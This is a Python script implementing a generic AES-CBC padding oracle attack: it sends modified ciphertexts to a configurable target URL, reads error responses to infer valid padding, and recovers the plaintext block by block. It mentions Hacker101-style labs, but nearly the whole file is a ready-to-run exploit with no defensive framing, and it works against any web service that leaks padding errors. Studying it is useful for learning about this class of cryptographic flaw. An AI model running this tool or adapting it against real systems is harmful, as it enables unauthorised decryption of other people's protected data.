#!/usr/bin/env python3
"""
AES-CBC Padding Oracle Attack Tool
Generic script to recover plaintext from AES-128-CBC ciphertext
when a padding oracle (different error responses) is available.

Usage:
  1. Set TARGET_URL and the encoded ciphertext below.
  2. Adjust is_valid_padding() if needed (debug mode included).
  3. Run: python3 aes_cbc_padding_oracle.py
"""

import base64
import requests
from urllib.parse import quote

# ==================== CONFIG ====================
TARGET_URL = "https://YOUR_INSTANCE.example.com/"   # base URL (no ?post=)
ENCODED_CT = "PASTE_THE_POST_VALUE_HERE"            # the long string after ?post=

# Set True to print status/body for every request (debugging)
DEBUG = False

# Encoding map used by the target (common custom Base64)
def custom_b64_decode(data: str) -> bytes:
    data = data.replace("-", "+").replace("!", "/").replace("~", "=")
    pad = len(data) % 4
    if pad:
        data += "=" * (4 - pad)
    return base64.b64decode(data)

def custom_b64_encode(data: bytes) -> str:
    s = base64.b64encode(data).decode()
    return s.replace("+", "-").replace("/", "!").replace("=", "~")

# ==================== ORACLE ====================
def is_valid_padding(ciphertext: bytes) -> bool:
    """
    Send the ciphertext to the target and decide if padding was valid.
    Default logic for typical Hacker101-style labs:
      - 500 / "padding" / "invalid" / stack traces → invalid padding
      - anything else → valid padding
    Flip the return values if your instance behaves the opposite way.
    """
    encoded = custom_b64_encode(ciphertext)
    url = f"{TARGET_URL}?post={quote(encoded, safe='')}"
    try:
        r = requests.get(url, timeout=10)
        body = r.text.lower()

        if DEBUG:
            print(f"  [debug] {r.status_code} | {body[:120].replace(chr(10), ' ')}")

        # Invalid padding indicators
        if r.status_code == 500:
            return False
        if "padding" in body or "invalid" in body or "error" in body or "traceback" in body:
            return False

        # Otherwise treat as valid
        return True
    except Exception as e:
        if DEBUG:
            print(f"  [debug] exception: {e}")
        return False

# ==================== ATTACK ====================
BLOCK = 16

def attack_block(prev_block: bytes, target_block: bytes) -> bytes:
    """Recover one plaintext block using the padding oracle."""
    intermediate = bytearray(BLOCK)
    plaintext = bytearray(BLOCK)

    for pad_len in range(1, BLOCK + 1):
        prefix = bytearray(prev_block)
        for i in range(1, pad_len):
            prefix[-i] = intermediate[-i] ^ pad_len

        found = False
        for guess in range(256):
            prefix[-pad_len] = guess
            test_ct = bytes(prefix) + target_block
            if is_valid_padding(test_ct):
                intermediate[-pad_len] = guess ^ pad_len
                plaintext[-pad_len] = intermediate[-pad_len] ^ prev_block[-pad_len]
                found = True
                break
        if not found:
            raise RuntimeError(
                f"Failed to find byte for padding length {pad_len}.\n"
                "→ Set DEBUG = True and re-run to inspect responses.\n"
                "→ You may need to invert the True/False returns in is_valid_padding()."
            )

    return bytes(plaintext)

def decrypt(ciphertext: bytes) -> bytes:
    if len(ciphertext) % BLOCK != 0:
        raise ValueError("Ciphertext length must be multiple of block size")

    iv = ciphertext[:BLOCK]
    blocks = [ciphertext[i:i+BLOCK] for i in range(BLOCK, len(ciphertext), BLOCK)]

    plaintext = b""
    prev = iv
    for i, block in enumerate(blocks):
        print(f"[*] Decrypting block {i+1}/{len(blocks)} ...")
        pt_block = attack_block(prev, block)
        plaintext += pt_block
        prev = block
        print(f"    -> {pt_block!r}")

    # strip PKCS#7 padding
    pad = plaintext[-1]
    if 1 <= pad <= BLOCK and plaintext.endswith(bytes([pad]) * pad):
        plaintext = plaintext[:-pad]
    return plaintext

# ==================== MAIN ====================
if __name__ == "__main__":
    print("[*] Decoding ciphertext...")
    ct = custom_b64_decode(ENCODED_CT)
    print(f"[+] Ciphertext length: {len(ct)} bytes")

    print("[*] Starting padding-oracle attack (this can take several minutes)...")
    pt = decrypt(ct)
    print("\n[+] Recovered plaintext:")
    print(pt.decode(errors="replace"))
